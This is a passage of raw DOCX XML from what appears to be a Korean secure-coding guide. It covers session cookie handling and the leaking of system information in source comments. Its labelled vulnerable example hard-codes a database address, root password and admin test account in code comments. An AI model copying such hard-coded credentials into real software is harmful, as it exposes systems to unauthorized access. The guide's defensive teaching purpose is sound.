                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>안전</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>중요</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>정보는</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>서버</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>세션에만</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>저장</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>쿠키는</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>세션</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> ID</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>만</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>포함</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">session.setAttribute("userRole", "admin");  // </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>서버</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>세션에</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>저장</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>Cookie cookie = new Cookie("JSESSIONID", session.getId());</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">cookie.setMaxAge(-1);      // </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>브라우저</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>닫으면</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>삭제</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> (</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>세션</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>쿠키</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>)</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">cookie.setHttpOnly(true);  // JS </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>접근</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>차단</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>cookie.setSecure(true);    // HTTPS</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>에서만</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>전송</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E"/>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">  13. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>주석문</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>안에</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>포함된</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>시스템</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>주요정보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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFF2CC"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>준수사항</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:ind w:left="170"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">• </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>소스코드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주석에</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> ID, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>패스워드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>내부</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> IP, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>시스템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구조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정보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등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보안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관련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정보를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기입하지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않는다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pP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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FCE4D6"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>취약한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>코드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>예</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>// [</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>취약</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>주석에</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>중요</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>정보</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>포함</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">// DB </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>접속</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>: 192.168.1.100:3306 / root / P@ssw0rd123</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">// </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>테스트</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>계정</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>: admin / admin1234</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>Connection con = getConnection();</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002B1872">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFF2CC"/>
          </w:tcPr>
          <w:p w:rsidR="002B1872" w:rsidRDefault="00913677">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>위험</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>주석의</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> IP·</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>계정</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>정보는</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>소스코드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>열람</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>권한만</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>있으면</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>누구나</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>확인할</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>수</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>있습니다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">. </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>테스트</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>계정</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
